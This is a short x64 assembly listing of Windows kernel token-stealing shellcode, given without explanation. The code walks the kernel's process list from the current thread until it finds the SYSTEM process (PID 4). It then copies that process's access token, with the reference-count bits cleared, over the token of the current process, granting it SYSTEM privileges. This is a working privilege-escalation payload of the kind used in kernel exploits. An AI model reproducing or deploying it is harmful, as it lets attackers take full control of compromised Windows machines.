[BIT 64]

_start:
    mov r8, qword [gs:0x188]        ; Dereference _KPCR -> _KPRCB to get current _KTHREAD
    mov r9, qword [r8 + 0xb8]       ; Dereference _KTHREAD -> _KAPC_STATE to get _KPROCESS
    mov rax, r9                     ;

_check:
    mov r9, qword [r9 + 0x2e8]      ; ActiveProcessLinks
    sub r9, 0x2e8                   ; Go to current process (_EPROCESS)
    mov rcx, qword [r9 + 0x2e0]     ; Check UniqueProcessId (PID)
    cmp rcx, 0x4                    ; Compare PID to SYSTEM PID
    jnz _check                      ; If not SYSTEM PID, check next process

    mov rcx, qword [r9 + 0x358]     ; Copy SYSTEM Token value
    and cl, 0xF0                    ; Clear _EX_FAST_REF
    mov qword [rax + 0x358], rcx    ; Copy SYSTEM Token to current process
